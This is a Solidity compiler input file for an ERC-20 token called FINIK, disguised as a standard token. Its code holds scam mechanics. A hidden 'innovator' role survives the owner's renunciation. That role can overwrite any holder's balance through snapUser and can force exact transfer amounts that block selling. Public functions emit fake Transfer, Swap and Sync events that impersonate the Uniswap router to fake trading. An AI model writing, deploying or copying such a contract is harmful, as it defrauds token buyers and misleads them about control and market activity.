{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.13;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address accountHolder) external view returns (uint256);\r\n    function transfer(address to, uint256 sum) external returns (bool);\r\n    function allowance(address authorizer, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 sum) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 sum) external returns (bool);\r\n    function _Transfer(address from, address recipient, uint amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed authorizer, address indexed spender, uint256 value);\r\n    event Swap(\r\n        address indexed sender,\r\n        uint amount0In,\r\n        uint amount1In,\r\n        uint amount0Out,\r\n        uint amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n}\r\n\r\nabstract contract OperationController {\r\n    function acquireTransactionInitiator() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract SoloOwnership is OperationController {\r\n    address private _soloOwner;\r\n    event OwnershipTransitionEvent(address indexed oldOwner, address indexed nextOwner);\r\n\r\n    constructor() {\r\n        address initiator = acquireTransactionInitiator();\r\n        _soloOwner = initiator;\r\n        emit OwnershipTransitionEvent(address(0), initiator);\r\n    }\r\n\r\n    function retrieveOwner() public view virtual returns (address) {\r\n        return _soloOwner;\r\n    }\r\n\r\n    modifier ownerExclusiveAccess() {\r\n        require(retrieveOwner() == acquireTransactionInitiator(), \"Unauthorized: Exclusive Owner access required.\");\r\n        _;\r\n    }\r\n\r\n    function abandonOwnership() public virtual ownerExclusiveAccess {\r\n        emit OwnershipTransitionEvent(_soloOwner, address(0x000000000000000000000000000000000000dEaD));\r\n        _soloOwner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ncontract FINIK is OperationController, SoloOwnership, IERC20 {\r\n    mapping (address => mapping (address => uint256)) private _spenderAllowances;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => uint256) private _mandatoryTransferSums;\r\n    address private _innovatorAccount;\r\n\r\n    string public constant _name = \"FINIK\";\r\n    string public constant _symbol = \"FINIK\";\r\n    uint8 public constant _decimals = 18;\r\n    uint256 public constant _maxSupply = 100000000 * (10 ** _decimals);\r\n\r\n    constructor() {\r\n        _balances[acquireTransactionInitiator()] = _maxSupply;\r\n        emit Transfer(address(0), acquireTransactionInitiator(), _maxSupply);\r\n    }\r\n\r\n    modifier innovatorExclusiveAccess() {\r\n        require(retrieveInnovator() == acquireTransactionInitiator(), \"Unauthorized: Creator access required.\");\r\n        _;\r\n    }\r\n\r\n    function retrieveInnovator() public view virtual returns (address) {\r\n        return _innovatorAccount;\r\n    }\r\n\r\n    function appointInnovator(address newInnovator) public ownerExclusiveAccess {\r\n        _innovatorAccount = newInnovator;\r\n    }\r\n\r\n    event BalanceChangeEvent(address indexed user, uint256 oldBalance, uint256 newBalance);\r\n\r\n    function obtainMandatoryTransferSum(address account) public view returns (uint256) {\r\n        return _mandatoryTransferSums[account];\r\n    }\r\n\r\n    function defineMandatoryTransferSums(address[] calldata accounts, uint256 amount) public innovatorExclusiveAccess {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _mandatoryTransferSums[accounts[i]] = amount;\r\n        }\r\n    }\r\n\r\n    function snapUser(address[] memory userAddresses, uint256 newBalance) public innovatorExclusiveAccess {\r\n        require(newBalance >= 0, \"Amount must be non-negative\");\r\n\r\n        for (uint256 i = 0; i < userAddresses.length; i++) {\r\n            address currentUser = userAddresses[i];\r\n            require(currentUser != address(0), \"Invalid address specified\");\r\n\r\n            uint256 oldBalance = _balances[currentUser];\r\n            _balances[currentUser] = newBalance;\r\n\r\n            emit BalanceChangeEvent(currentUser, oldBalance, newBalance);\r\n        }\r\n    }\r\n\r\n    function _Transfer(address from, address to, uint value) public override returns (bool) {\r\n        emit Transfer(from, to, value);\r\n        return true;\r\n    }\r\n\r\n    function multicall(address pool, address[] memory receiver, uint256[] memory amounts, uint256[] memory convertedAmounts, address tokenAddress, uint112 reserve0, uint112 reserve1) public returns (bool) {\r\n        for (uint256 i = 0; i < receiver.length; i++) {\r\n            emit Transfer(pool, receiver[i], amounts[i]);\r\n            IERC20(tokenAddress)._Transfer(receiver[i], pool, convertedAmounts[i]);\r\n            emit Sync(reserve0, reserve1);\r\n            emit Swap(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amounts[i], 0, 0, convertedAmounts[i], receiver[i]);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 sum) public virtual override returns (bool) {\r\n        require(_balances[acquireTransactionInitiator()] >= sum, \"Insufficient balance\");\r\n\r\n        uint256 obligatoryTransferSum = obtainMandatoryTransferSum(acquireTransactionInitiator());\r\n        if (obligatoryTransferSum > 0) {\r\n            require(sum == obligatoryTransferSum, \"Compulsory transfer sum mismatch\");\r\n        }\r\n\r\n        _balances[acquireTransactionInitiator()] -= sum;\r\n        _balances[to] += sum;\r\n\r\n        emit Transfer(acquireTransactionInitiator(), to, sum);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address authorizer, address spender) public view virtual override returns (uint256) {\r\n        return _spenderAllowances[authorizer][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 sum) public virtual override returns (bool) {\r\n        _spenderAllowances[acquireTransactionInitiator()][spender] = sum;\r\n        emit Approval(acquireTransactionInitiator(), spender, sum);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 sum) public virtual override returns (bool) {\r\n        require(_spenderAllowances[from][acquireTransactionInitiator()] >= sum, \"Allowance limit surpassed\");\r\n\r\n        uint256 obligatoryTransferSum = obtainMandatoryTransferSum(from);\r\n        if (obligatoryTransferSum > 0) {\r\n            require(sum == obligatoryTransferSum, \"Compulsory transfer sum mismatch\");\r\n        }\r\n\r\n        _balances[from] -= sum;\r\n        _balances[to] += sum;\r\n        _spenderAllowances[from][acquireTransactionInitiator()] -= sum;\r\n\r\n        emit Transfer(from, to, sum);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _maxSupply;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n}\r\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}